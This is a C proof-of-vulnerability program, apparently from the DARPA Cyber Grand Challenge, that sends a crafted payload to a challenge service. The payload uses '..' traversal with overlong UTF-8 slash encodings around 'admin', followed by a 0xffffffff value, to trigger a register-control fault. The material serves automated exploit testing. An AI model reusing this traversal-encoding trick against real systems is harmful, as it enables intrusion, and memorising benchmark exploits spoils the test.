#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   //*** delay
   cgc_delay(100);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x01\x00\x00\x00\x2e\x2e\xc0\xaf\x61\x64\x6d\x69\x6e\xc0\xaf\x41"
         "\x41\x41\x41\x00\x04\x00\x00\x00\x42\x42\x42\x42";
      static unsigned int write_00000_00000_len = 28;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\xff\xff\xff\xff";
      static unsigned int write_00001_00000_len = 4;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
}
